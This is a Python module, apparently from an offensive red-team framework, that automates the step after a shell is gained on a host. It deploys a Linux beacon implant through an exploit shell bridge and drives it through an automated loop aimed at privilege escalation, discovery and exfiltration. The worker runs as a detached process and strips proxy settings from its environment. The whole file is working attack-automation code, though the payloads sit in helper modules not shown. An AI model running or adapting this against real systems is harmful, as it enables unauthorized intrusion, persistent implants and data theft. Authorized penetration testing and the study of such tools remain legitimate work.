"""Foothold-to-beacon handoff for the autonomous loop.

When any shell producer (the autonomous loop, auto_pwn fallback, chain
runner) publishes a shell-confirmed outcome, this module deploys the
Linux beacon (``blacksandbeacon``) through the existing atomic exploit
shell primitive and then drives the connected implant with the playbook
ladder of :mod:`modules.beacon_loop` (awareness -> discovery -> privesc
-> exfiltration). The handoff is OS-aware: Windows hosts are skipped
(beacon delivery for Windows runs through the lazyaddon prompt) and the
beacon loop inherits the platform from the beacon records and
``sessions/os.json``.

Contract:
    - Gated on ``payload.json`` flag ``loop_beacon_handoff`` (default off)
      with the kill switch ``LAZYOWN_BEACON_HANDOFF=0``.
    - Disabled under pytest so tests never spawn deployment threads.
    - At most one in-flight handoff per host; a deployed marker re-arms once
  the beacon stops reporting or its re-arm window expires.
    - Never raises: every failure path logs and degrades.
"""

from __future__ import annotations

import argparse
import json
import logging
import os
import subprocess
import sys
import threading
from collections.abc import Callable
from datetime import UTC, datetime
from pathlib import Path
from typing import Any

from core.hardening import sanitize_filename as _sanitize_filename
from modules.outcome_bus import SESSIONS_DIR

log = logging.getLogger("lazyown.handoff")

HANDOFF_FLAG: str = "loop_beacon_handoff"
HANDOFF_ENV: str = "LAZYOWN_BEACON_HANDOFF"
POST_FOOTHOLD_GOAL: str = "privilege escalation, situational awareness and exfiltration"
DEFAULT_DEPLOY_WAIT_S: float = 120.0
DEFAULT_ROUNDS: int = 8
HANDOFF_REARM_S: float = 600.0
BEACON_LIVENESS_S: float = 3600.0
_MARKER_PREFIX: str = "beacon_handoff_"
_marker_lock = threading.Lock()


def handoff_enabled(payload: dict[str, Any] | None = None) -> bool:
    """Return True when the foothold-to-beacon handoff may run.

    Args:
        payload: Optional payload mapping override (tests).

    Returns:
        False when the flag is off, the env kill switch is ``0`` or the
        process runs under pytest.
    """
    if os.environ.get("PYTEST_CURRENT_TEST"):
        return False
    if str(os.environ.get(HANDOFF_ENV, "") or "").strip() == "0":
        return False
    try:
        if payload is None:
            from core.config import load_payload

            payload = load_payload() or {}
        return bool(payload.get(HANDOFF_FLAG))
    except Exception:
        return False


def _marker_path(target: str, sessions_dir: Path) -> Path:
    """Return the durable dedupe marker path for one host.

    Args:
        target: Host the shell was confirmed on.
        sessions_dir: Sessions directory.

    Returns:
        Marker file path inside the sessions directory.
    """
    safe = _sanitize_filename(target or "unknown")
    return sessions_dir / f"{_MARKER_PREFIX}{safe}.json"


def _beacon_is_live(target: str, sessions_dir: Path) -> bool:
    """Return True when a beacon for the target reported recently.

    Args:
        target: Host to check.
        sessions_dir: Sessions directory holding beacon history.

    Returns:
        True when a matching beacon has a fresh record.
    """
    try:
        from modules.beacon_history import BeaconHistoryConfig, read_records
        from modules.bof_delivery import BofDeliveryConfig, beacon_for_target

        cfg = BofDeliveryConfig(sessions_dir=sessions_dir)
        client_id = beacon_for_target(target, config=cfg)
        if not client_id:
            return False
        rows = read_records(client_id, config=BeaconHistoryConfig(base_dir=sessions_dir.parent))
        if not rows:
            return False
        stamp = str(rows[-1].get("timestamp", ""))
        moment = datetime.fromisoformat(stamp.replace("Z", "+00:00"))
        if moment.tzinfo is None:
            moment = moment.replace(tzinfo=UTC)
        return (datetime.now(UTC) - moment).total_seconds() <= BEACON_LIVENESS_S
    except Exception:
        return False


def already_handed_off(target: str, sessions_dir: Path = SESSIONS_DIR) -> bool:
    """Return True when a handoff is in flight or still within re-arm grace.

    A pending marker always blocks a second worker. A deployed marker blocks
    only while the beacon still reports or the re-arm window has not expired.

    Args:
        target: Host address.
        sessions_dir: Sessions directory.

    Returns:
        True when a new handoff must be skipped.
    """
    marker = _marker_path(target, sessions_dir)
    if not marker.is_file():
        return False
    try:
        state = json.loads(marker.read_text(encoding="utf-8"))
    except (OSError, ValueError):
        return True
    status = str(state.get("status", "deployed"))
    if status == "pending":
        return True
    if status != "deployed":
        return False
    moment = None
    stamp = str(state.get("updated_at", ""))
    if stamp:
        try:
            moment = datetime.fromisoformat(stamp.replace("Z", "+00:00"))
            if moment.tzinfo is None:
                moment = moment.replace(tzinfo=UTC)
        except ValueError:
            moment = None
    if moment is None:
        try:
            moment = datetime.fromtimestamp(marker.stat().st_mtime, tz=UTC)
        except OSError:
            return True
    if (datetime.now(UTC) - moment).total_seconds() < HANDOFF_REARM_S:
        return True
    return _beacon_is_live(target, sessions_dir)


def maybe_beacon_handoff(
    target: str,
    source: str = "",
    log: Callable[[str], None] = print,
    sessions_dir: Path = SESSIONS_DIR,
    wait_s: float = DEFAULT_DEPLOY_WAIT_S,
    rounds: int = DEFAULT_ROUNDS,
    task_id: str = "",
) -> bool:
    """Start the beacon handoff for one confirmed foothold.

    Skips silently when disabled, already handed off, the host is
    missing or the target is Windows. On the first call for a host it
    writes the dedupe marker and spawns a daemon thread that deploys the
    beacon, waits for check-in and runs the playbook beacon loop.

    Args:
        target: Host the shell was confirmed on.
        source: Outcome source label (loop, fallback, chain).
        log: Line logger for the loop viewer.
        sessions_dir: Sessions directory.
        wait_s: Seconds to wait for the first beacon check-in.
        rounds: Maximum beacon_loop rounds.
        task_id: Loop task id used for activity-log notifications.

    Returns:
        True when a handoff thread was started.
    """
    host = str(target or "").strip()
    if not host or not handoff_enabled():
        return False
    try:
        from modules.lazy_osinfer import host_os_for_target

        if host_os_for_target(host) == "windows":
            log(f"[handoff] windows beacon delivery not automated for {host}; use the lazyaddon prompt")
            return False
    except Exception:
        pass
    sessions_dir.mkdir(parents=True, exist_ok=True)
    marker = _marker_path(host, sessions_dir)
    with _marker_lock:
        if already_handed_off(host, sessions_dir):
            return False
        try:
            marker.write_text(
                json.dumps(
                    {"target": host, "source": source, "status": "pending", "task_id": str(task_id or "")},
                    indent=2,
                ),
                encoding="utf-8",
            )
        except OSError:
            return False
    worker_args = [
        sys.executable,
        "-m",
        "modules.lazy_handoff",
        "--worker",
        "--target",
        host,
        "--source",
        source,
        "--wait-s",
        str(wait_s),
        "--rounds",
        str(rounds),
        "--task-id",
        str(task_id or ""),
    ]
    try:
        sessions_dir.mkdir(parents=True, exist_ok=True)
        log_path = sessions_dir / f"{_MARKER_PREFIX}{_sanitize_filename(host)}.log"
        env = {
            key: value
            for key, value in os.environ.items()
            if not key.lower().endswith("_proxy")
        }
        env["NO_PROXY"] = "*"
        env["no_proxy"] = "*"
        with open(log_path, "ab", buffering=0) as log_file:
            subprocess.Popen(
                worker_args,
                stdout=log_file,
                stderr=subprocess.STDOUT,
                cwd=str(Path(__file__).resolve().parent.parent),
                env=env,
                start_new_session=True,
            )
    except OSError:
        _mark_status(host, sessions_dir, "failed")
        return False
    log(f"[handoff] foothold on {host}: deploying beacon and starting beacon_loop")
    return True


def _handoff_worker(
    target: str,
    source: str,
    log: Callable[[str], None],
    sessions_dir: Path,
    wait_s: float,
    rounds: int,
    task_id: str = "",
) -> None:
    """Deploy the beacon then drive the playbook beacon loop (worker thread).

    Args:
        target: Host the shell was confirmed on.
        source: Outcome source label.
        log: Line logger.
        sessions_dir: Sessions directory.
        wait_s: Seconds to wait for the first beacon check-in.
        rounds: Maximum beacon_loop rounds.
        task_id: Loop task id used for activity-log notifications.
    """

    def activity(kind: str, text: str) -> None:
        if not task_id:
            return
        try:
            from modules.lazy_loop import ActivityLog

            ActivityLog(task_id).emit("handoff", kind, text)
        except Exception:
            pass

    try:
        from modules.beacon_loop import BeaconLoopConfig, run_beacon_loop, write_report
        from modules.bof_delivery import deploy_client

        try:
            from core.config import load_payload as _load_payload
            from modules.atomic_exploit_bridge import open_shell

            payload = _load_payload() or {}
            if open_shell(target, lhost=str(payload.get("lhost", "127.0.0.1") or "127.0.0.1")) is None:
                log(f"[handoff] no exec-capable shell for {target}; cannot deliver beacon")
                _mark_status(target, sessions_dir, "failed")
                return
        except Exception as exc:
            log(f"[handoff] shell open for {target} failed: {exc}")
            _mark_status(target, sessions_dir, "failed")
            return
        result = deploy_client("blacksandbeacon", target, wait=wait_s)
        if not result.get("success"):
            log(f"[handoff] beacon deploy failed for {target}: {result.get('reason', 'unknown')}")
            _mark_status(target, sessions_dir, "failed")
            return
        client_id = str(result.get("client_id", "") or "").strip()
        if not client_id:
            log(f"[handoff] beacon deployed on {target} without a client id")
            _mark_status(target, sessions_dir, "failed")
            return
        _mark_status(target, sessions_dir, "deployed", client_id=client_id)
        activity("deployed", f"beacon {client_id} checked in on {target}; starting beacon_loop")
        config = BeaconLoopConfig(client_id=client_id, goal=POST_FOOTHOLD_GOAL, rounds=rounds)
        report = run_beacon_loop(config, log=log, sessions_dir=sessions_dir)
        write_report(report, sessions_dir=sessions_dir)
        log(f"[handoff] beacon_loop finished for {client_id} verdict={report.verdict}")
        activity(
            "complete",
            f"beacon_loop {client_id} verdict={report.verdict} queued={len(report.commands_queued)}",
        )
    except Exception as exc:
        log(f"[handoff] beacon handoff for {target} failed: {exc}")
        _mark_status(target, sessions_dir, "failed")


def _mark_status(target: str, sessions_dir: Path, status: str, client_id: str = "") -> None:
    """Update the dedupe marker status (never raises).

    Args:
        target: Host address.
        sessions_dir: Sessions directory.
        status: One of ``pending``, ``deployed``, ``failed``.
        client_id: Beacon client id once known.
    """
    try:
        marker = _marker_path(target, sessions_dir)
        state = {}
        if marker.is_file():
            state = json.loads(marker.read_text(encoding="utf-8"))
        state.update({"status": status, "updated_at": datetime.now(UTC).isoformat()})
        if client_id:
            state["client_id"] = client_id
        marker.write_text(json.dumps(state, indent=2), encoding="utf-8")
    except (OSError, ValueError):
        pass


__all__ = [
    "HANDOFF_ENV",
    "HANDOFF_FLAG",
    "POST_FOOTHOLD_GOAL",
    "already_handed_off",
    "handoff_enabled",
    "maybe_beacon_handoff",
]


def _main() -> int:
    """Run the detached handoff worker (``python -m modules.lazy_handoff --worker``)."""
    parser = argparse.ArgumentParser(description="Foothold-to-beacon handoff worker")
    parser.add_argument("--worker", action="store_true")
    parser.add_argument("--target", required=True)
    parser.add_argument("--source", default="")
    parser.add_argument("--wait-s", type=float, default=DEFAULT_DEPLOY_WAIT_S)
    parser.add_argument("--rounds", type=int, default=DEFAULT_ROUNDS)
    parser.add_argument("--task-id", default="")
    args = parser.parse_args()
    _handoff_worker(
        args.target,
        args.source,
        log=print,
        sessions_dir=SESSIONS_DIR,
        wait_s=args.wait_s,
        rounds=args.rounds,
        task_id=args.task_id,
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(_main())
